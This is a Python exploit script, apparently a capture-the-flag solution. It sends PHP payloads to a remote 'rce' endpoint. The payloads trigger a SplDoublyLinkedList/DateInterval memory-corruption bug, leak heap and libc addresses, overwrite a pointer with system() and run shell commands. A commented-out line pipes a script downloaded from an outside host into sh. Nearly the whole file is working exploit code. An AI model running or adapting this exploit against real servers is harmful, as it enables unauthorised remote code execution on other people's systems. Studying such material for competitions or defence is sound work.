# by junorouse
from requests import post
from pwn import *

url = 'http://localhost:7989';
url = 'http://52.53.55.151:11514/';

payload_leak = '''
$spec = "P2Y4DT6H8M";
$dllist = new SplDoublyLinkedList();
$dllist->push(new DateInterval($spec));

var_dump($dllist);
var_dump($s = serialize($dllist));

var_dump($dllist->top());
$leak = $dllist->top()->y;

printf("leak 0x%x\n", $leak);

''';


c = post(url, data={'rce': payload_leak}, headers={'Content-Type': 'application/x-www-form-urlencoded'}, stream=True);
heap_addr = int(c.text.split('leak ')[1].split('\n')[0], 16)
print hex(heap_addr)

payload_libc = '''error_reporting(E_ALL);
ini_set('display_errors', 1);
function hex_dump($data, $newline="\\n")
{
  static $from = '';
  static $to = '';
  static $width = 16; # number of bytes per line
  static $pad = '.'; # padding for non-visible characters
  if ($from==='')
  {
    for ($i=0; $i<=0xFF; $i++)
    {
      $from .= chr($i);
      $to .= ($i >= 0x20 && $i <= 0x7E) ? chr($i) : $pad;
    }
  }
  $hex = str_split(bin2hex($data), $width*2);
  $chars = str_split(strtr($data, $from, $to), $width);
  $offset = 0;
  foreach ($hex as $i => $line)
  {
    echo sprintf('%6X',$offset).' : '.implode(' ', str_split($line,2)) . ' [' . $chars[$i] . ']' . $newline;
    $offset += $width;
  }
}
// reserve valid heap chunks
$arr = [];
$arr[] = str_repeat("1", 23);
$arr[] = str_repeat("2", 23);
$arr[] = str_repeat("3", 23);
$arr[] = str_repeat("4", 23);
$arr[] = str_repeat("5", 23);
$spec = "P2Y4DT6H8M";
$dllist = new SplDoublyLinkedList();
$dllist->push(new DateInterval($spec));
var_dump($dllist);
var_dump($s = serialize($dllist));
var_dump($dllist->top());
$leak = $dllist->top()->y;
var_dump("bp");
$dllist->top()->y -= 0x88;
var_dump("bp");
$x = str_repeat("A", 23);
var_dump($x);
$y = str_repeat("B", 23);
var_dump($y);
// overwrite size of $x
$z = pack("QQQ", 0x0000000600000002, 0, 0x100000000000);
// now we have an overlap chunk - release valid chunks to prevent corrupted allocation
unset($arr);
$x_buf_addr = $leak-0x58;
// step 1
// zval_ptr_dtor = 0x7FF327863FE0
$leak_target = $x_buf_addr;
$leak_size = 0x100;
// step 2
$code_leak = 0x7FF327863FE0;
$leak_target = $code_leak + 0xa2caf0;
$leak_size = 16;
hex_dump(substr($x, $leak_target - $x_buf_addr, $leak_size));'''

with post(url, data={'rce': payload_libc}, headers={'Content-Type': 'application/x-www-form-urlencoded'}) as c:
    print c.text

# print 'try..', hex(i)
target = heap_addr + 0xf8 - 0x20

print 'target', hex(target)

# system = heap_addr + 0xd000280 + (i << 12)

system = 0x7ff32adea440  # remote
# system = 0x7f6780467440  # local

print hex(system)
# 0x2a3d50

# 0x7f6d23dae440
payload_rce = '''
$spec = "P2Y4DT6H8M";
$dllist = new SplDoublyLinkedList();
$dllist->push(new DateInterval($spec));

var_dump($dllist);
var_dump($s = serialize($dllist));

var_dump($dllist->top());
$leak = $dllist->top()->y;
printf("leak: 0x%x\n", $leak);
var_dump("bp");

// $dllist->top()->y -= 0x88;
$dllist->top()->y -= (0x40 + 0x10 + 0x30 - 8);
var_dump("bp");

// $x = str_repeat("A", 23);
//

$z = pack("QQQ", 0x41424344, 0x41424345, {});

// $y = str_repeat("B", 23);
// $y= pack("QQQ", 0x61626364, 0x61626364, 0x61626364);
$y = str_repeat("{}BBBBBBBBBBBBBBB", 1);
var_dump($y);

// $z = pack("QQQ", leak + 0x30, 0, 0x17);
// $z = pack("QQQ", 0x41424344, 0x41424344, 0x41424344);
// $z = str_repeat("\x1fcurl app.imjuno.com|sh", 1);
$z = str_repeat("\x1f/tmp/junox;sleep 0   ", 1);
var_dump($z);

// var_dump($dllist);

echo "fuck!!!\\n";

var_dump($dllist->top()->y); // trigger
var_dump("bp");


'''.format(hex(target), repr(p64(system)).replace("'", ''))

print payload_rce


c = post(url, data={'rce': payload_rce}, headers={'Content-Type': 'application/x-www-form-urlencoded'});
print c.text
